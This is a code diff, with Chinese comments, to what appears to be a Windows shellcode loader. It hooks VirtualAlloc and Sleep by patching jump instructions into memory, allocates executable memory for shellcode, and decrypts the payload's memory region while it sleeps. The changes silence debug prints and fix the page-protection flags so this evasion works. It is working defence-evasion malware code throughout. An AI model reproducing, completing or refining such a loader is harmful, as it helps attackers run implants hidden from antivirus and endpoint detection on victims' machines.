@@ -407,7 +407,7 @@ LPVOID HookedVirtualAlloc(LPVOID lpAddress,SIZE_T dwSize,DWORD flAlloctionType,D
     // 调用原来的VirtualAlloc  
     LPVOID address = VirtualAlloc(lpAddress,dwSize,flAlloctionType,flProtect);
 
-    printf("VirtialAlloc %08X %d %d %d %d \n", address, dwSize, flAlloctionType, flProtect);
+    //printf("VirtialAlloc %08X %d %d %d %d \n", address, dwSize, flAlloctionType, flProtect);
     hook_virtual_count = hook_virtual_count+1;
     if (hook_virtual_count == 1) {
         address_jQuery = address;
@@ -449,7 +449,7 @@ void HookVirtualAlloc() {
     // 方式三，使用push ret绝对地址跳转push <绝对地址>   ; 68 <绝对地址>ret             ; C3
     char patch[5] = { 0xE9, 0, 0, 0, 0 };
     memcpy_s(patch + 1, 4, &offsetAddress, 4);
-    printf("\nhookaddress:%p\n", hookaddress_virutalallc);
+    //printf("\nhookaddress:%p\n", hookaddress_virutalallc);
     // 将挂钩写入VirtualAllocc内存    
     WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_virutalallc, patch, sizeof(patch), NULL);
 
@@ -481,10 +481,10 @@ VOID WINAPI HookedSleep(DWORD dwMilliseconds) {
     // 解除挂钩VirtualAlloc
     WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_sleep, sleepOriginalBytes, sizeof(sleepOriginalBytes), NULL);
     Sleep(dwMilliseconds);
-    VirtualProtect(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
+    VirtualProtect(address_main, address_main_size, PAGE_READWRITE, lpflOldProtect);
     // 解密函数
     decrypt_memory(address_main, address_main_size, key);
-    VirtualProtect(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
+    VirtualProtect(address_main, address_main_size, PAGE_EXECUTE, lpflOldProtect);
     // 重新挂钩
     HookSleep();
 
@@ -649,7 +649,7 @@ int main(int argc, CHAR* argv[]) {
             hookaddress_sleep = (LPVOID)sleepa;  //获取到sleep的地址
             HookSleep();
             //Sleep(10000);
-            printf("HookedVirtualAlloc is :%p\n", (DWORD_PTR)HookedVirtualAlloc);
+            //printf("HookedVirtualAlloc is :%p\n", (DWORD_PTR)HookedVirtualAlloc);
             char* a = (char*)(*p)(NULL, str.length(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //get a memory to save shellcode
             printf("变量p的地址: %p\n", p);
             hookaddress_virutalallc = (LPVOID)p;   //获取到virtualalloc的地址
